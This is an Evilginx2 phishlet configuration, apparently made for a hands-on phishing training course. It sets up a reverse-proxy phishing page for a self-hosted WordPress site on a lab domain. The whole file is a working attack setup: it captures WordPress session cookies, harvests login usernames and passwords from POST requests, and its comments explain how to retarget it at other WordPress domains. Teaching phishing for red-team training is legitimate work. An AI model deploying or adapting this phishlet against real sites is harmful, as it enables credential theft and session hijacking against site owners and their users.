# Evilginx phishlet configuration file for self hosted  WordPress domains.
# Created for use with the HANDS ON PHISHING COURSE by Tyler Ramsbey
# Edited version of the general wordpress.org phishlet from An0nUD4Y phishlets repo 
# I recommend checking it out. As such the comments from the original
# phishlet remain in tact it's just a matter of editing the domain names and furhter
# customization to suit your own needs
# 
# LINK TO ORIGINAL REPO: https://github.com/An0nUD4Y/Evilginx2-Phishlets
# LINK TO MY REPO: 
 
---
name: 'Hacksmarter-manufacturing.shop'
author: 'AsherDMckoy'
min_ver: '2.3.0'

proxy_hosts:
    # Proxy the primary domain.
    - phish_sub: ''
      orig_sub: ''
      domain: 'hacksmarter-manufacturing.shop' 
      session: true
      is_landing: true

sub_filters: []

# For self-hosted WordPress sites, you may find it easier to use a
# regular expression to match session cookies, as the cookie names
# are produced unqiely per-site. This can be done as follows:
#
# ```yaml
# - domain: 'self-hosted-domain.com'
#   keys:
#       - 'wordpress_sec_.*,regexp'
#       - 'wordpress_logged_in_.*,regexp'
# ```
#
# If you do choose to use the regular expression facility, you
# will also then need to use the `auth_urls` dictionary to define
# when Evilginx should actually capture these tokens. Something
# like this should do the trick:
#
# ```yaml
# auth_urls:
#     - '.*/wp-admin/.*'
# ```
#
# The above ensures that the `auth_tokens` are noticed whenever
# the phished user makes requests to URLs containing `wp-admin`.
#
# For the WordPress.org service itself, however, none of the above is
# necessary, and the following simple `auth_tokens` dictionary should
# work just fine.
auth_urls:
    - '.*/wp-login.php'
    - '.*/wp-admin/.*'
    - '.*/wp-admin'

auth_tokens:
    - domain: 'hacksmarter-manufacturing.shop'
      keys: ['wordpress_logged_in_*:regexp', 'wordpress_sec_*:regexp', 'wordpress_test_cookie:regexp', 'wp-settings-*:regexp', 'wp-settings-time-*:regexp', 'wp_lang:regexp']

credentials:
    username:
        key: 'log'
        search: '(.*)'
        type: 'post'
    password:
        key: 'pwd'
        search: '(.*)'
        type: 'post'

# For a self-hosted WordPress site, you'll probably want to define the
# `login` dictionary here as follows:
#
# ```yaml
# login:
#     domain: 'self-hosted-domain.com'
#     path: '/wp-login.php'
# ```
#
# Some WordPress plugins, such as WooCommerce, change the URL of the
# login page. You'll want to examine the specific site for this.
login:
    domain: 'hacksmarter-manufacturing.shop'
    path: '/wp-login.php'
